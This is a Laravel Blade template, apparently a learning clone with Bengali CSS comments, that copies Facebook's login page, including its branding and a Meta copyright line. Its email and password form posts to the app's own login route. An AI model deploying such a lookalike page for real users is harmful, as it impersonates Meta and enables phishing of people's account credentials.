<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: white;
    }

    .container {
      display: flex;
      flex-wrap:wrap; 
      align-items: center;
      padding: 20px 10px;
      justify-content:center;
      gap:20px;
      margin:150px 0;
    }
    .container > div {
  flex: 1 1 45%;          /* desktop এ দুইটি child পাশাপাশি */
   max-width: 300px;       /* খুব ছোট screen এও minimum width থাকবে */
}

/* Responsive media query */
@media screen and (max-width: 800px) {
  .container {
    justify-content: center;  /* screen ছোট হলে centered দেখাবে */
  }

  .container > div {
    flex: 1 1 100%;           /* child div full width নেবে */
    max-width: 300px;         /* max width optional */
  }
}

    .left {
      width: 400px;
    }

    .left h1 {
      color: #1877f2;
      font-size: 60px;
      margin: 0;
      font-weight: bold;
    }

    .left p {
      font-size: 24px;
      color: #1c1e21;
      margin-top: 10px;
    }

    .login-box {
      width:400px;
      background: #fff;
      padding: 2%;
      border-radius: 8px;
      box-shadow: 0px 2px 16px rgba(0,0,0,0.2);
      text-align: center;
    }

    .login-box input {
      width: 100%;        /* সব সময় container-এর প্রস্থ অনুযায়ী adjust হবে */
  max-width: 400px;  /* খুব বড় screen এ too wide হবে না */
  padding: 10px 15px; /* ভেতরের ফাঁকা জায়গা */
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 6px;
  box-sizing: border-box; 
  margin: 5px 0;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      background: #1877f2;
      color: #fff;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .login-box button:hover {
      background: #166fe5;
    }

    .login-box a {
      display: block;
      margin-top: 10px;
      text-decoration: none;
      color: #1877f2;
      font-size: 14px;
    }

    .divider {
      border-top: 1px solid #dadde1;
      margin: 20px 0;
    }

    .create-btn {
      background: #42b72a !important;
    }

    .create-btn:hover {
      background: #36a420 !important;
    }

    .footer {
      text-align: center;
      color: #737373;
      font-size: 12px;
      margin-top: 50px;
    }
    .error-message {
      color: #d93025;
      font-size: 12px;
      margin-top: 4px;
    }

  </style>
</head>
<body>
  <div class="container">
    <!-- Left side -->
    <div class="left">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share  with the people in your life.</p>
    </div>
    <!-- Login box -->
    <div class="login-box">
    @if ($errors->any())
      <div class="error-message" style="background: #f8d7da; border: 1px solid #f5c6cb; padding: 10px; border-radius: 6px; margin-bottom: 15px;">
        <ul style="list-style: none; margin: 0; padding: 0;">
          @foreach ($errors->all() as $error)
            <li>{{ $error }}</li>
          @endforeach
        </ul>
      </div>
    @endif
      <form method="POST" action="{{ route('login.store') }}">
      @csrf
        <input type="text" name="email" placeholder="Email address or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
        <a href="{{ route('forget-pass') }}">Forgotten password?</a>
        <div class="divider"></div>
        <button type="button" class="create-btn"onclick="window.location.href='{{ route('signup') }}'" >Create new account</button>
      </form>
    </div>
  </div>

  <div class="footer">
    <p>English (UK) · বাংলা · हिन्दी · اردو · Español · Português (Brasil)</p>
    <p>Meta © 2025</p>
  </div>
</body>
</html>
